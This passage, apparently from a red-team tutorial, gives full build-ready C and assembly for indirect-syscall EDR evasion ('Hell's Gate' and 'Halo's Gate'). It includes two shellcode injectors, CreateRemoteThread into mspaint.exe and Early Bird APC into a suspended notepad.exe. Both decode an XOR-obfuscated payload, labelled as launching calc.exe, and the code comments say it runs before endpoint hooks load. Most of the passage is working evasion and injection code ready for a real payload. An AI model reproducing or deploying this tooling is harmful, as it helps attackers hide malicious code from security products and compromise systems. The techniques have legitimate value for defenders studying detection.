[+] NtQueueApcThread                 @ 00007ffb881ed8a0  SSN = 0x45 (69)
[+] NtResumeThread                   @ 00007ffb881eda40  SSN = 0x52 (82)
```

Running it confirms that the code worked.

`hells_gate.h`:

```c
#pragma once
#include <windows.h>
#include <stdio.h>

#define SSN_NOT_FOUND 0xFFFFFFFF

// globals defined in syscalls.S
// SSNs: resolved at runtime by reading ntdll stub bytes
// addrs: ntdll syscall gadget address (func + 0x12) for indirect jump
extern DWORD     g_NtAllocSsn;
extern DWORD     g_NtWriteSsn;
extern DWORD     g_NtProtectSsn;
extern DWORD     g_NtQueueApcSsn;
extern DWORD     g_NtResumeSsn;

extern ULONG_PTR g_NtAllocAddr;
extern ULONG_PTR g_NtWriteAddr;
extern ULONG_PTR g_NtProtectAddr;
extern ULONG_PTR g_NtQueueApcAddr;
extern ULONG_PTR g_NtResumeAddr;

// Walk PEB->Ldr->InMemoryOrderModuleList to get ntdll base.
// No API calls used. ntdll is always the second entry in the list (after the exe).
// Offsets (x64):
//   PEB+0x18 = Ldr pointer
//   Ldr+0x20 = InMemoryOrderModuleList.Flink  (exe entry)
//   entry->Flink                               (ntdll entry's InMemoryOrderLinks)
//   InMemoryOrderLinks+0x20                    (DllBase, since InMemoryOrderLinks
//                                               sits at +0x10 inside the struct
//                                               and DllBase sits at +0x30)
static PVOID get_ntdll_base(void) {
    ULONG_PTR peb, ldr, flink;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
    ldr   = *(ULONG_PTR*)(peb  + 0x18);
    flink = *(ULONG_PTR*)(ldr  + 0x20); // InMemoryOrderModuleList.Flink -> exe
    flink = *(ULONG_PTR*)(flink);        // exe->Flink -> ntdll InMemoryOrderLinks
    return (PVOID)*(ULONG_PTR*)(flink + 0x20); // +0x20 from InMemoryOrderLinks = DllBase
}

// Walk a module's Export Address Table by name.
// Returns the function's VA, or NULL if not found.
static PVOID get_func_addr(PVOID base, const char *name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)base + dos->e_lfanew);

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(
        (ULONG_PTR)base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    PDWORD names = (PDWORD)((ULONG_PTR)base + exp->AddressOfNames);
    PWORD  ords  = (PWORD) ((ULONG_PTR)base + exp->AddressOfNameOrdinals);
    PDWORD funcs = (PDWORD)((ULONG_PTR)base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *n = (char *)((ULONG_PTR)base + names[i]);
        if (strcmp(n, name) == 0)
            return (PVOID)((ULONG_PTR)base + funcs[ords[i]]);
    }
    return NULL;
}

// Read the SSN from an unhooked ntdll stub.
// Clean stub layout:
//   +0x00  4C 8B D1        mov r10, rcx
//   +0x03  B8 XX XX XX XX  mov eax, <SSN>   <- read 4 bytes at +0x04
//   +0x08  ...
//   +0x12  0F 05           syscall
//
// If +0x00 is E9 (jmp) the stub is hooked; we return SSN_NOT_FOUND.
static DWORD get_ssn(PVOID func) {
    ULONG_PTR p = (ULONG_PTR)func;
    if (*(BYTE*)(p+0) == 0x4C &&
        *(BYTE*)(p+1) == 0x8B &&
        *(BYTE*)(p+2) == 0xD1 &&
        *(BYTE*)(p+3) == 0xB8)
        return *(DWORD*)(p + 0x04);
    return SSN_NOT_FOUND;
}

// Resolve SSNs and indirect syscall gadgets for all five Nt* functions.
//
// Hell's Gate part: read SSN from ntdll stub bytes at runtime instead of
// hardcoding. Works on any Windows version with no lookup table.
//
// Indirect syscall part: store func+0x12 as the jump target so the
// kernel sees ntdll as the syscall origin rather than our binary.
//
// Returns 0 on success, -1 if any stub appears hooked.
static int resolve_hells_gate(void) {
    PVOID ntdll = get_ntdll_base();
    printf("[*] ntdll base: %p\n", ntdll);

    PVOID  p;
    DWORD  ssn;

    #define RESOLVE(fn, ssn_g, addr_g) \
        p = get_func_addr(ntdll, fn); \
        if (!p) { printf("[-] %s not found in EAT\n", fn); return -1; } \
        ssn = get_ssn(p); \
        if (ssn == SSN_NOT_FOUND) { printf("[-] %s is hooked\n", fn); return -1; } \
        ssn_g  = ssn; \
        addr_g = (ULONG_PTR)p + 0x12; \
        printf("[*] %-32s SSN=0x%02X  gadget=%p\n", fn, ssn, (void*)addr_g)

    RESOLVE("NtAllocateVirtualMemory", g_NtAllocSsn,    g_NtAllocAddr);
    RESOLVE("NtWriteVirtualMemory",    g_NtWriteSsn,     g_NtWriteAddr);
    RESOLVE("NtProtectVirtualMemory",  g_NtProtectSsn,   g_NtProtectAddr);
    RESOLVE("NtQueueApcThread",        g_NtQueueApcSsn,  g_NtQueueApcAddr);
    RESOLVE("NtResumeThread",          g_NtResumeSsn,    g_NtResumeAddr);

    #undef RESOLVE
    return 0;
}
```

`syscalls.S`:

```c
.intel_syntax noprefix

.global SysNtAllocateVirtualMemory
.global SysNtWriteVirtualMemory
.global SysNtProtectVirtualMemory
.global SysNtQueueApcThread
.global SysNtResumeThread

// SSN globals: written by resolve_hells_gate() at startup
// Using .long (32-bit) since SSNs fit in a DWORD
.data
.global g_NtAllocSsn
.global g_NtWriteSsn
.global g_NtProtectSsn
.global g_NtQueueApcSsn
.global g_NtResumeSsn

g_NtAllocSsn:    .long 0
g_NtWriteSsn:    .long 0
g_NtProtectSsn:  .long 0
g_NtQueueApcSsn: .long 0
g_NtResumeSsn:   .long 0

// Gadget address globals: func+0x12 inside ntdll, where syscall instruction lives
.global g_NtAllocAddr
.global g_NtWriteAddr
.global g_NtProtectAddr
.global g_NtQueueApcAddr
.global g_NtResumeAddr

g_NtAllocAddr:    .quad 0
g_NtWriteAddr:    .quad 0
g_NtProtectAddr:  .quad 0
g_NtQueueApcAddr: .quad 0
g_NtResumeAddr:   .quad 0

.text

// Each stub:
//   1. mov r10, rcx          -- Windows x64 syscall ABI requires first arg in r10
//   2. mov eax, [SSN global] -- Hell's Gate: SSN read from memory, resolved at runtime
//   3. jmp [gadget addr]     -- indirect syscall: fires from inside ntdll, not our binary
//
// No ret needed; ntdll's own ret instruction returns us to the C caller.

SysNtAllocateVirtualMemory:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtAllocSsn]
    jmp     qword ptr [rip + g_NtAllocAddr]

SysNtWriteVirtualMemory:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtWriteSsn]
    jmp     qword ptr [rip + g_NtWriteAddr]

SysNtProtectVirtualMemory:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtProtectSsn]
    jmp     qword ptr [rip + g_NtProtectAddr]

SysNtQueueApcThread:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtQueueApcSsn]
    jmp     qword ptr [rip + g_NtQueueApcAddr]

SysNtResumeThread:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtResumeSsn]
    jmp     qword ptr [rip + g_NtResumeAddr]
```

`CreateRemoteThread.c`:

```c
// CreateRemoteThread injection
// SSN resolution: Hell's Gate (reads ntdll stub bytes at runtime, no hardcoded SSNs)
// Syscall execution: indirect (jumps to ntdll's syscall gadget, clean call stack)
// Memory: RW alloc -> write -> RW->RX flip -> CreateRemoteThread
// Shellcode: multi-byte XOR encoded at rest, decoded into heap before injection
//
// Build:
//   x86_64-w64-mingw32-gcc syscalls.S CreateRemoteThread.c -o crt_inject.exe

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "hells_gate.h"

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

extern NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

extern NTSTATUS SysNtWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

extern NTSTATUS SysNtProtectVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

// calc.exe shellcode (windows/x64/exec CMD=calc.exe, 276 bytes)
// XOR-encoded with key {0xDE, 0xAD, 0xBE, 0xEF}
static unsigned char sc_enc[] = {
    0x22,0xe5,0x3d,0x0b,0x2e,0x45,0x7e,0xef,0xde,0xad,0xff,0xbe,0x9f,0xfd,
    0xec,0xbe,0x88,0xe5,0x8f,0x3d,0xbb,0xe5,0x35,0xbd,0xbe,0xe5,0x35,0xbd,
    0xc6,0xe5,0x35,0xbd,0xfe,0xe5,0x35,0x9d,0x8e,0xe5,0xb1,0x58,0x94,0xe7,
    0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0x91,0xdf,0x93,0xdc,0x81,0x9e,0xae,
    0x1f,0x64,0xb3,0xae,0xdf,0x6c,0x5c,0x02,0x8c,0xec,0xef,0xa7,0x55,0xff,
    0x9e,0x64,0x9c,0x91,0xf6,0xee,0x0e,0x26,0x3e,0x67,0xde,0xad,0xbe,0xa7,
    0x5b,0x6d,0xca,0x88,0x96,0xac,0x6e,0xbf,0x55,0xe5,0xa6,0xab,0x55,0xed,
    0x9e,0xa6,0xdf,0x7d,0x5d,0xb9,0x96,0x52,0x77,0xae,0x55,0x99,0x36,0xa7,
    0xdf,0x7b,0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0xec,0x7f,0x26,0xd3,0xec,
    0xbf,0x2e,0xe6,0x4d,0xcb,0x1e,0x92,0xae,0xf2,0xcb,0xd6,0xe8,0x87,0x3e,
    0xab,0x75,0xe6,0xab,0x55,0xed,0x9a,0xa6,0xdf,0x7d,0xd8,0xae,0x55,0xa1,
    0xf6,0xab,0x55,0xed,0xa2,0xa6,0xdf,0x7d,0xff,0x64,0xda,0x25,0xf6,0xee,
    0x0e,0xec,0xe6,0xae,0x86,0xf3,0xe7,0xb5,0x9f,0xf5,0xff,0xb6,0x9f,0xf7,
    0xf6,0x6c,0x32,0x8d,0xff,0xbd,0x21,0x4d,0xe6,0xae,0x87,0xf7,0xf6,0x64,
    0xcc,0x44,0xe9,0x10,0x21,0x52,0xe3,0xa7,0x64,0xac,0xbe,0xef,0xde,0xad,
    0xbe,0xef,0xde,0xe5,0x33,0x62,0xdf,0xac,0xbe,0xef,0x9f,0x17,0x8f,0x64,
    0xb1,0x2a,0x41,0x3a,0x65,0x5d,0x0b,0x4d,0x88,0xec,0x04,0x49,0x4b,0x10,
    0x23,0x10,0x0b,0xe5,0x3d,0x2b,0xf6,0x91,0xb8,0x93,0xd4,0x2d,0x45,0x0f,
    0xab,0xa8,0x05,0xa8,0xcd,0xdf,0xd1,0x85,0xde,0xf4,0xff,0x66,0x04,0x52,
    0x6b,0x8c,0xbf,0xc1,0xdd,0xc1,0xbb,0xd5,0xdb,0xef,
};

static const unsigned char xor_key[] = {0xDE, 0xAD, 0xBE, 0xEF};

static void xor_decode(unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= xor_key[i % sizeof(xor_key)];
}

static DWORD pid_by_name(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

int main(void) {
    // resolve SSNs from ntdll stubs and gadget addresses for indirect jump
    if (resolve_hells_gate() != 0) return 1;
    printf("\n");

    DWORD pid = pid_by_name("mspaint.exe");
    if (!pid) { printf("[-] mspaint.exe not found\n"); return 1; }
    printf("[*] Target PID: %lu\n", pid);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess: %lu\n", GetLastError()); return 1; }

    unsigned char *decoded = (unsigned char *)malloc(sizeof(sc_enc));
    memcpy(decoded, sc_enc, sizeof(sc_enc));
    xor_decode(decoded, sizeof(sc_enc));

    PVOID  buf  = NULL;
    SIZE_T size = sizeof(sc_enc);

    NTSTATUS st = SysNtAllocateVirtualMemory(
        hProc, &buf, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!NT_SUCCESS(st)) { printf("[-] NtAllocateVirtualMemory: 0x%lX\n", st); return 1; }
    printf("[+] Remote buffer: %p (%zu bytes)\n", buf, size);

    SIZE_T written = 0;
    st = SysNtWriteVirtualMemory(hProc, buf, decoded, sizeof(sc_enc), &written);
    free(decoded);
    if (!NT_SUCCESS(st)) { printf("[-] NtWriteVirtualMemory: 0x%lX\n", st); return 1; }
    printf("[+] Wrote %zu bytes\n", written);

    ULONG  old_prot      = 0;
    SIZE_T protect_size  = sizeof(sc_enc);
    st = SysNtProtectVirtualMemory(hProc, &buf, &protect_size, PAGE_EXECUTE_READ, &old_prot);
    if (!NT_SUCCESS(st)) { printf("[-] NtProtectVirtualMemory: 0x%lX\n", st); return 1; }
    printf("[+] Protection: RW -> RX (was 0x%lX)\n", old_prot);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
    if (!hThread) { printf("[-] CreateRemoteThread: %lu\n", GetLastError()); return 1; }
    printf("[+] Thread: %p\n", hThread);

    WaitForSingleObject(hThread, 4000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

`EarlyBird.c`:

```c
// Early Bird APC injection
// SSN resolution: Hell's Gate (reads ntdll stub bytes at runtime, no hardcoded SSNs)
// Syscall execution: indirect (jumps to ntdll's syscall gadget, clean call stack)
// Flow: spawn suspended -> RW alloc -> write -> RW->RX flip -> queue APC -> resume
// Shellcode: multi-byte XOR encoded at rest, decoded into heap before injection
//
// Build:
//   x86_64-w64-mingw32-gcc syscalls.S EarlyBird.c -o earlybird.exe

#include <windows.h>
#include <stdio.h>
#include "hells_gate.h"

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

extern NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

extern NTSTATUS SysNtWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

extern NTSTATUS SysNtProtectVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

extern NTSTATUS SysNtQueueApcThread(
    HANDLE ThreadHandle,
    PVOID  ApcRoutine,
    PVOID  ApcArgument1,
    PVOID  ApcArgument2,
    PVOID  ApcArgument3
);

extern NTSTATUS SysNtResumeThread(
    HANDLE  ThreadHandle,
    PULONG  PreviousSuspendCount
);

// calc.exe shellcode (windows/x64/exec CMD=calc.exe, 276 bytes)
// XOR-encoded with key {0xDE, 0xAD, 0xBE, 0xEF}
static unsigned char sc_enc[] = {
    0x22,0xe5,0x3d,0x0b,0x2e,0x45,0x7e,0xef,0xde,0xad,0xff,0xbe,0x9f,0xfd,
    0xec,0xbe,0x88,0xe5,0x8f,0x3d,0xbb,0xe5,0x35,0xbd,0xbe,0xe5,0x35,0xbd,
    0xc6,0xe5,0x35,0xbd,0xfe,0xe5,0x35,0x9d,0x8e,0xe5,0xb1,0x58,0x94,0xe7,
    0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0x91,0xdf,0x93,0xdc,0x81,0x9e,0xae,
    0x1f,0x64,0xb3,0xae,0xdf,0x6c,0x5c,0x02,0x8c,0xec,0xef,0xa7,0x55,0xff,
    0x9e,0x64,0x9c,0x91,0xf6,0xee,0x0e,0x26,0x3e,0x67,0xde,0xad,0xbe,0xa7,
    0x5b,0x6d,0xca,0x88,0x96,0xac,0x6e,0xbf,0x55,0xe5,0xa6,0xab,0x55,0xed,
    0x9e,0xa6,0xdf,0x7d,0x5d,0xb9,0x96,0x52,0x77,0xae,0x55,0x99,0x36,0xa7,
    0xdf,0x7b,0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0xec,0x7f,0x26,0xd3,0xec,
    0xbf,0x2e,0xe6,0x4d,0xcb,0x1e,0x92,0xae,0xf2,0xcb,0xd6,0xe8,0x87,0x3e,
    0xab,0x75,0xe6,0xab,0x55,0xed,0x9a,0xa6,0xdf,0x7d,0xd8,0xae,0x55,0xa1,
    0xf6,0xab,0x55,0xed,0xa2,0xa6,0xdf,0x7d,0xff,0x64,0xda,0x25,0xf6,0xee,
    0x0e,0xec,0xe6,0xae,0x86,0xf3,0xe7,0xb5,0x9f,0xf5,0xff,0xb6,0x9f,0xf7,
    0xf6,0x6c,0x32,0x8d,0xff,0xbd,0x21,0x4d,0xe6,0xae,0x87,0xf7,0xf6,0x64,
    0xcc,0x44,0xe9,0x10,0x21,0x52,0xe3,0xa7,0x64,0xac,0xbe,0xef,0xde,0xad,
    0xbe,0xef,0xde,0xe5,0x33,0x62,0xdf,0xac,0xbe,0xef,0x9f,0x17,0x8f,0x64,
    0xb1,0x2a,0x41,0x3a,0x65,0x5d,0x0b,0x4d,0x88,0xec,0x04,0x49,0x4b,0x10,
    0x23,0x10,0x0b,0xe5,0x3d,0x2b,0xf6,0x91,0xb8,0x93,0xd4,0x2d,0x45,0x0f,
    0xab,0xa8,0x05,0xa8,0xcd,0xdf,0xd1,0x85,0xde,0xf4,0xff,0x66,0x04,0x52,
    0x6b,0x8c,0xbf,0xc1,0xdd,0xc1,0xbb,0xd5,0xdb,0xef,
};

static const unsigned char xor_key[] = {0xDE, 0xAD, 0xBE, 0xEF};

static void xor_decode(unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= xor_key[i % sizeof(xor_key)];
}

int main(void) {
    // resolve SSNs from ntdll stubs and gadget addresses for indirect jump
    if (resolve_hells_gate() != 0) return 1;
    printf("\n");

    STARTUPINFOA        si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED,
            NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] PID %lu TID %lu (suspended)\n", pi.dwProcessId, pi.dwThreadId);

    unsigned char *decoded = (unsigned char *)malloc(sizeof(sc_enc));
    memcpy(decoded, sc_enc, sizeof(sc_enc));
    xor_decode(decoded, sizeof(sc_enc));

    PVOID  buf  = NULL;
    SIZE_T size = sizeof(sc_enc);

    NTSTATUS st = SysNtAllocateVirtualMemory(
        pi.hProcess, &buf, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!NT_SUCCESS(st)) { printf("[-] NtAllocateVirtualMemory: 0x%lX\n", st); goto fail; }
    printf("[+] Remote buffer: %p\n", buf);

    SIZE_T written = 0;
    st = SysNtWriteVirtualMemory(pi.hProcess, buf, decoded, sizeof(sc_enc), &written);
    free(decoded);
    if (!NT_SUCCESS(st)) { printf("[-] NtWriteVirtualMemory: 0x%lX\n", st); goto fail; }
    printf("[+] Wrote %zu bytes\n", written);

    ULONG  old_prot     = 0;
    SIZE_T protect_size = sizeof(sc_enc);
    st = SysNtProtectVirtualMemory(pi.hProcess, &buf, &protect_size, PAGE_EXECUTE_READ, &old_prot);
    if (!NT_SUCCESS(st)) { printf("[-] NtProtectVirtualMemory: 0x%lX\n", st); goto fail; }
    printf("[+] Protection: RW -> RX (was 0x%lX)\n", old_prot);

    // Queue APC to the suspended main thread.
    // Thread enters alertable wait before the entry point, so APC fires first.
    // Shellcode runs before any process code, before EDR hooks load in the target.
    st = SysNtQueueApcThread(pi.hThread, buf, NULL, NULL, NULL);
    if (!NT_SUCCESS(st)) { printf("[-] NtQueueApcThread: 0x%lX\n", st); goto fail; }
    printf("[+] APC queued at %p\n", buf);

    ULONG prev = 0;
    st = SysNtResumeThread(pi.hThread, &prev);
    if (!NT_SUCCESS(st)) { printf("[-] NtResumeThread: 0x%lX\n", st); goto fail; }
    printf("[+] Resumed (prev suspend count: %lu)\n", prev);

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;

fail:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}
```

But there is a limitation to Hells Gate. If an EDR is present the stub looks like this:

```c
+0x00  E9 XX XX XX XX   jmp  <EDR hook>
+0x05  garbage
```

Our check for `4C 8B D1 B8` fails. We return `SSN_NOT_FOUND` and have no SSN to give the stub. Hell's Gate is completely blind the moment any hook is present on the target function. This is what the Halo's Gate solves.
## Halo's Gate

ntdll's `Nt*` functions are laid out **contiguously in memory**, sorted alphabetically. Their SSNs are assigned in that same order. Each function's SSN is exactly one more than the previous function's SSN, you can confirm it in x64dbg if you want.

```c
NtAccessCheck                SSN = 0x00
NtWorkerFactoryWorkerReady   SSN = 0x01
NtAcceptConnectPort          SSN = 0x02
...
NtAllocateVirtualMemory      SSN = 0x18
NtAllocateVirtualMemoryEx    SSN = 0x19   <- neighbor above, SSN = 0x18 + 1
...
```

So if `NtAllocateVirtualMemory` is let's say hooked and we cannot read it's SSN. We can look at the function sitting immediately next to it in memory. If that neighbor is clean we read it's SSN and subtract 1 to get ours. If the neighbor above is also hooked we try two steps away and subtract 2. We keep walking until we find a clean stub. This works because Microsoft assigns SSNs by sorting the `Nt*` functions alphabetically and numbering them starting from zero. The functions are also stored contiguously in ntdll's `.text` section in that same order. So address order and SSN order are the same, a function at a higher address always has a higher SSN, by exactly the number of stubs between them.

![](/img/halos.png)

Each ntdll stub is a fixed size. On modern Windows x64 every stub is exactly `0x20` bytes (32 bytes). So:

<svg width="100%" viewBox="0 0 680 420" role="img">
<title>Halo's Gate neighbor stub walking</title>
<desc>Shows how Halo's Gate walks neighboring stubs above and below a hooked target to recover the SSN</desc>
<defs>
<marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
<path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
</marker>
</defs>

<!-- two above -->
<rect x="160" y="20" width="360" height="52" rx="6" fill="#1e2a1e" stroke="#2a5a2a" stroke-width="1"/>
<text font-family="monospace" font-size="11" font-weight="600" fill="white" x="340" y="41" text-anchor="middle">two above — funcAddr + 0x40</text>
<text font-family="monospace" font-size="10" fill="#9fe1cb" x="340" y="60" text-anchor="middle">clean stub — SSN + 2   →   our SSN = neighbor SSN - 2</text>

<line x1="340" y1="72" x2="340" y2="100" stroke="#2a5a2a" stroke-width="1" stroke-dasharray="4 2"/>

<!-- one above -->
<rect x="160" y="102" width="360" height="52" rx="6" fill="#1e2a1e" stroke="#2a5a2a" stroke-width="1"/>
<text font-family="monospace" font-size="11" font-weight="600" fill="white" x="340" y="123" text-anchor="middle">neighbor above — funcAddr + 0x20</text>
<text font-family="monospace" font-size="10" fill="#9fe1cb" x="340" y="142" text-anchor="middle">clean stub — SSN + 1   →   our SSN = neighbor SSN - 1</text>

<line x1="340" y1="154" x2="340" y2="182" stroke="#555" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- target hooked -->
<rect x="120" y="184" width="440" height="52" rx="6" fill="#6b1f1f" stroke="#9a2a2a" stroke-width="1"/>
<text font-family="monospace" font-size="11" font-weight="600" fill="white" x="340" y="205" text-anchor="middle">target — funcAddr  (HOOKED)</text>
<text font-family="monospace" font-size="10" fill="#ffaaaa" x="340" y="224" text-anchor="middle">E9 XX XX XX XX   jmp &lt;EDR hook&gt;   SSN unreadable</text>

<line x1="340" y1="236" x2="340" y2="264" stroke="#555" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- one below -->
<rect x="160" y="266" width="360" height="52" rx="6" fill="#1e2a1e" stroke="#2a5a2a" stroke-width="1"/>
<text font-family="monospace" font-size="11" font-weight="600" fill="white" x="340" y="287" text-anchor="middle">neighbor below — funcAddr - 0x20</text>
<text font-family="monospace" font-size="10" fill="#9fe1cb" x="340" y="306" text-anchor="middle">clean stub — SSN - 1   →   our SSN = neighbor SSN + 1</text>

<line x1="340" y1="318" x2="340" y2="346" stroke="#2a5a2a" stroke-width="1" stroke-dasharray="4 2"/>

<!-- two below -->
<rect x="160" y="348" width="360" height="52" rx="6" fill="#1e2a1e" stroke="#2a5a2a" stroke-width="1"/>
<text font-family="monospace" font-size="11" font-weight="600" fill="white" x="340" y="369" text-anchor="middle">two below — funcAddr - 0x40</text>
<text font-family="monospace" font-size="10" fill="#9fe1cb" x="340" y="388" text-anchor="middle">clean stub — SSN - 2   →   our SSN = neighbor SSN + 2</text>

<!-- left bracket label -->
<line x1="118" y1="20" x2="100" y2="20" stroke="#555" stroke-width="0.5"/>
<line x1="100" y1="20" x2="100" y2="400" stroke="#555" stroke-width="0.5"/>
<line x1="100" y1="400" x2="118" y2="400" stroke="#555" stroke-width="0.5"/>
<text font-family="monospace" font-size="10" fill="#888" x="94" y="212" text-anchor="middle" transform="rotate(-90,94,212)">walk outward until clean stub found</text>

</svg>

We walk outward in both directions until we find a clean stub, then adjust the SSN by the number of steps we took.

```c
// Halo's Gate SSN resolution test
// Credit: original implementation by @C5pider, Havoc Framework / Demon implant
//
// Build:
//   x86_64-w64-mingw32-gcc halos_gate_test.c -o halos_gate_test.exe

#include <windows.h>
#include <stdio.h>

BOOLEAN GetSSNInternal( PBYTE NtFunction, PWORD SSN )
{
    DWORD Offset  = 0;
    BYTE  SSNLow  = 0;
    BYTE  SSNHigh = 0;

    if ( !SSN )
        return FALSE;

    do {
        if ( *( NtFunction + Offset ) == 0xC3 )
            break;

        if ( *( NtFunction + Offset + 0 ) == 0x4C &&
             *( NtFunction + Offset + 1 ) == 0x8B &&
             *( NtFunction + Offset + 2 ) == 0xD1 &&
             *( NtFunction + Offset + 3 ) == 0xB8 )
        {
            SSNLow  = *( NtFunction + Offset + 4 );
            SSNHigh = *( NtFunction + Offset + 5 );
            *SSN    = ( SSNHigh << 8 ) | SSNLow;
            return TRUE;
        }
        Offset++;
    } while ( TRUE );

    return FALSE;
}

DWORD GetFunctionSize( PVOID Function )
{
    PBYTE                   Module           = ( PBYTE ) GetModuleHandleA( "ntdll.dll" );
    PIMAGE_NT_HEADERS       NtHeader         = ( PIMAGE_NT_HEADERS )( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = ( PIMAGE_EXPORT_DIRECTORY )( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    SIZE_T                  ExpDirectorySize = NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
    PDWORD                  AddrOfFunctions  = ( PDWORD )( Module + ExpDirectory->AddressOfFunctions );
    PDWORD                  AddrOfNames      = ( PDWORD )( Module + ExpDirectory->AddressOfNames );
    PWORD                   AddrOfOrdinals   = ( PWORD  )( Module + ExpDirectory->AddressOfNameOrdinals );
    PVOID                   FunctionAddr     = NULL;
    PCHAR                   FunctionName     = NULL;
    PBYTE                   Addr1            = NULL;
    PBYTE                   Addr2            = NULL;
    DWORD                   SyscallSize      = 0;
    DWORD                   Offset           = 0;

    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
        if ( ( PBYTE ) FunctionAddr >= ( PBYTE ) ExpDirectory &&
             ( PBYTE ) FunctionAddr  < ( PBYTE ) ExpDirectory + ExpDirectorySize )
            continue;

        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
        if ( *( PWORD ) FunctionName != 0x775a )
            continue;

        if ( !Addr1 ) {
            Addr1 = Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ];
            continue;
        }

        Addr2  = Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ];
        Offset = Addr1 > Addr2 ? Addr1 - Addr2 : Addr2 - Addr1;

        if ( !SyscallSize || Offset < SyscallSize )
            SyscallSize = Offset;
    }

    return SyscallSize;
}

WORD GetSSN( PBYTE NtFunction )
{
    WORD   SSN       = 0;
    DWORD  Counter   = 0;
    DWORD  SzNtApi   = 0;
    PVOID  Neighbour = NULL;

    if ( GetSSNInternal( NtFunction, &SSN ) )
        return SSN;

    SzNtApi = GetFunctionSize( NtFunction );

    while ( SSN == 0 && Counter < 200 ) {
        Neighbour = NtFunction + ( SzNtApi * Counter );
        if ( GetSSNInternal( Neighbour, &SSN ) ) { SSN -= Counter; break; }

        Neighbour = NtFunction - ( SzNtApi * Counter );
        if ( GetSSNInternal( Neighbour, &SSN ) ) { SSN += Counter; break; }

        Counter++;
    }

    return SSN;
}

void main()
{
    HMODULE ntdll = GetModuleHandleA( "ntdll.dll" );

    const char* funcs[] = {
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtQueueApcThread",
        "NtResumeThread",
    };

    printf( "[*] stub size: 0x%X bytes\n\n",
